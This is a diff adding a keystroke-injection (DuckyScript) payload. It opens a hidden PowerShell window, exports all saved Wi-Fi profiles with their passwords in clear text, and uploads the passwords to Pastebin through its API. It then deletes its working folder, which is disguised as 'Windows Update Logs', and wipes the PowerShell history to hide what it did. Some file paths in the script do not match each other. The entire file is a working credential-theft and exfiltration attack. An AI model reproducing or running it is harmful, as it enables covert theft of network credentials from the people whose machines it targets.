@@ -1,0 +1,85 @@
+LED 0 0 0
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell.exe -windowstyle hidden
+DELAY 100
+ENTER
+DELAY 500
+STRING New-Item -ItemType "directory" -Path "C:\Windows Update Logs\System Info\WiFi Diagnostics\"
+DELAY 100
+ENTER
+DELAY 100
+STRING cd "C:\Windows Update Logs\WiFi Diagnostics\"
+DELAY 100
+ENTER
+DELAY 100
+STRING netsh wlan export profile key=clear
+DELAY 100
+ENTER
+DELAY 300
+STRING Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > debug_wifi_details.file
+DELAY 100
+ENTER
+DELAY 100
+STRING Remove-Item "C:\Windows Update Logs\WiFi Diagnostics\*Wi-Fi*"
+DELAY 100
+ENTER
+REM DELAY 100
+STRING $extract = Get-content -Path "C:\Windows Update Logs\WiFi Diagnostics\System Info\debug_wifi_details.file"
+DELAY 100
+ENTER
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING $Body = @{ api_dev_key = 'ur api dev key here'
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING api_paste_code = ("$extract")
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING api_paste_private = 2
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING api_paste_expire_date = '10M'
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING api_paste_name = 'Wifi Details'
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING api_option = 'paste'
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING api_user_key = 'ur api user key'};
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post
+DELAY 100
+ENTER
+DELAY 100
+STRING cd C:\
+DELAY 100
+ENTER
+STRING Remove-Item "C:\Windows Update Logs"
+DELAY 100
+ENTER
+DELAY 300
+STRING y
+DELAY 100
+ENTER
+DELAY 100
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
+DELAY 100
+ENTER
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
+LED 0 255 0
